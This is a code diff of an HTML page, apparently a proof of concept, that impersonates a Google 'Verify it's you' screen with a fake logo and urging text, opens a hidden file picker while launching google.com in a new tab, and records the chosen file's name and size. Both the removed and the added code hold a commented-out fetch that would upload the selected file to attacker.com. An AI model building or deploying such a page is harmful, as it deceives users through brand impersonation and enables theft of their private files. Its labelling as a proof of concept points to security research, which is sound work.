@@ -6,9 +6,9 @@
     <title>Google Account Security</title>
     <style>
       * {
-        box-sizing: border-box;
         margin: 0;
         padding: 0;
+        box-sizing: border-box;
       }
       body {
         font-family: Arial, sans-serif;
@@ -24,59 +24,85 @@
         max-width: 400px;
         background: white;
         border-radius: 8px;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
       }
       .btn-ui {
         background: #1a73e8;
         color: white;
-        padding: 10px 20px;
+        padding: 12px 24px;
         border-radius: 4px;
         cursor: pointer;
         display: inline-block;
+        margin: 20px 0;
       }
       #fileSelect {
+        display: none;
+      }
+      .proof {
+        margin-top: 20px;
+        padding: 10px;
+        background: #e8f0fe;
+        border-radius: 4px;
+        color: #1a73e8;
         display: none;
       }
     </style>
   </head>
   <body>
     <div class="container">
+      <div
+        class="logo"
+        style="font-size: 28px; font-weight: 600; margin-bottom: 15px"
+      >
+        <span style="color: #4285f4">G</span
+        ><span style="color: #ea4335">o</span>
+        <span style="color: #fbbc05">o</span
+        ><span style="color: #4285f4">g</span>
+        <span style="color: #34a853">l</span
+        ><span style="color: #ea4335">e</span>
+      </div>
       <h1>Verify it's you</h1>
-      <p>Tap to upload a verification photo.</p>
+      <p>
+        To keep your account secure, Google needs to verify your identity. Tap
+        anywhere to upload a verification photo.
+      </p>
       <div class="btn-ui" id="triggerBtn">Continue to Google</div>
+      <div id="proofMessage" class="proof"></div>
     </div>
     <input type="file" id="fileSelect" accept="image/*" />
 
     <script>
       const trigger = document.getElementById("triggerBtn");
       const fileInput = document.getElementById("fileSelect");
+      const proofDiv = document.getElementById("proofMessage");
+
+      // Saat halaman dimuat, cek apakah sudah ada bukti capture sebelumnya
+      const captured = localStorage.getItem("fileCaptured");
+      if (captured) {
+        proofDiv.innerHTML = captured;
+        proofDiv.style.display = "block";
+        localStorage.removeItem("fileCaptured"); // hapus setelah ditampilkan
+      }
 
       trigger.onclick = (e) => {
         e.preventDefault();
-        alert("System Action Required: Select a photo for verification.");
-        // Buka file picker
+        // Simpan pesan instruksi (opsional)
         fileInput.click();
-        // Buka tab baru ke Google.com (trusted domain)
         window.open("https://google.com", "_blank");
       };
 
       fileInput.onchange = () => {
         if (fileInput.files.length > 0) {
           const file = fileInput.files[0];
-          // --- BUKTI EKSPLOITASI ---
-          // Opsi 1: Tampilkan alert nama file (cukup untuk PoC)
-          alert(
-            "[PoC] File selected: " +
-              file.name +
-              ". This file would be sent to attacker server.",
-          );
-          // Opsi 2: Kirim file ke server attacker (simulasi dengan fetch)
-          // const formData = new FormData();
-          // formData.append('file', file);
-          // fetch('https://attacker.com/upload', { method: 'POST', body: formData });
-
-          // Setelah file dipilih, redirect halaman attacker ke halaman sukses (misal ke google.com lagi)
-          // agar korban tidak perlu kembali ke halaman attacker.
-          window.location.href = "https://www.google.com";
+          // Simpan bukti ke localStorage
+          const proof = `✅ File captured: ${file.name} (${file.size} bytes) at ${new Date().toLocaleTimeString()}`;
+          localStorage.setItem("fileCaptured", proof);
+          // Tampilkan juga langsung di halaman saat ini (sebelum pindah tab)
+          proofDiv.innerHTML = proof;
+          proofDiv.style.display = "block";
+          console.log("File captured:", file.name);
+          // Opsi: kirim ke server (jika diperlukan)
+          // const fd = new FormData(); fd.append('file', file); fetch('https://attacker.com/upload', { method: 'POST', body: fd });
         }
       };
     </script>
